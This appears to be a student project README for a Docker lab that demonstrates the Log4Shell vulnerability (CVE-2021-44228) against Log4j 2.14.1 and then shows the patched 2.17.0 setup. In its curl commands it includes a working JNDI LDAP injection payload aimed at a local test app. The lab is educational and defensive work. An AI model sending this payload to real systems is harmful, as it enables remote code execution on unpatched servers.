# HW9-Log4Shell Exploit

This project sets up a Docker-based environment to demonstrate the exploitation of the Log4Shell vulnerability (CVE-2021-44228), apply common defensive measures, and simulate an incident response process. It is designed for educational and training purposes only.

---

## 🛠️ Installation Instructions

### Step 1: Set Up the Vulnerable Environment

Deploy a Java application with a vulnerable version of Log4j (2.14.1) using Docker Compose.

```bash
cd ../Exploit
docker-compose up --build

#After the environment is up and running, simulate an attack using the following commands:

curl -H "Content-Type: text/plain" --data 'test' http://localhost:8080/log
curl -X POST http://localhost:8080/log -d "${jndi:ldap://host.docker.internal:389/a}"

#Teardown
docker-compose down
docker ps -a  # Ensure no containers are still running

#Defend 

#Switch to the defense environment:
cd ../Defend
docker-compose up --build

#Run a harmless log entry and a repeat of the exploit attempt:

#Windows Command Prompt
curl -X POST http://localhost:8080/log -d "Hello, world!"
curl -H "Content-Type: text/plain" --data 'test' http://localhost:8080/log"
curl -X POST http://localhost:8080/log -d "${jndi:ldap://host.docker.internal:389/a}"

#Technologies Used
#Docker
#Docker Compose
#Java (Log4j 2.14.1 in Exploit and Log4j 2.17.0 in Defend)
#Maven
#MITRE ATT&CK Framework

#Author:
#Yvette Kushmerick
